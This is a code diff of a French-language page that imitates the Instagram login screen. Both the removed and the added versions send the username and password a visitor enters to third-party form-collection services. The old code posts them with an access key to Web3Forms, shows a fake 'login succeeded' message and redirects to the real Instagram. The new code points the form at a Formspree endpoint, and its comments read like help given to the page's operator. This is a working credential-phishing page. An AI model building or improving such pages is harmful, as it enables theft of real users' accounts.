@@ -140,9 +140,10 @@
             <i class="fab fa-instagram"></i>
         </div>
         <h2>Connectez-vous pour voir les photos et vidéos de vos amis.</h2>
-        <form id="loginForm" onsubmit="submitForm(event)">
-            <input type="text" id="username" name="username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
-            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        <!-- Le formulaire pointe maintenant directement vers votre endpoint Formspreée -->
+        <form action="https://formspree.io/f/xnjkragr" method="POST">
+            <input type="text" name="username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <div class="divider">
@@ -169,59 +170,12 @@
     <div id="notification" class="notification"></div>
 
     <script>
-        function showNotification(message, type) {
-            const notification = document.getElementById('notification');
-            notification.textContent = message;
-            notification.className = 'notification ' + type;
-            notification.style.display = 'block';
-            
-            setTimeout(() => {
-                notification.style.display = 'none';
-            }, 5000);
-        }
-
-        function submitForm(event) {
-            event.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Créer un objet avec les données du formulaire
-            const formData = {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                access_key: "88ca9dcb-21f2-47d3-bd33-0e955bd72b7b"  // Votre clé Web3Forms
-            };
-            
-            console.log("Envoi des données:", formData); // Pour le débogage
-
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData),
-            })
-            .then(response => {
-                console.log("Réponse du serveur:", response); // Pour le débogage
-                if (!response.ok) {
-                    throw new Error('La réponse du réseau n\'était pas valide');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log("Données reçues:", data); // Pour le débogage
-                showNotification("Connexion réussie !", "success");
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com";
-                }, 2000);
-            })
-            .catch(error => {
-                console.error('Erreur:', error); // Pour le débogage
-                showNotification("Une erreur est survenue. Veuillez réessayer.", "error");
-            });
-        }
+        // Petit script pour afficher un message après l'envoi
+        document.querySelector('form').addEventListener('submit', function(e) {
+            // On laisse Formspreée gérer l'envoi normal
+            // On pourrait ajouter du JS ici si on voulait une redirection personnalisée sans rechargement
+            // Mais la méthode HTML simple (action="...") est plus fiable pour Formspreée
+        });
     </script>
 </body>
 </html>
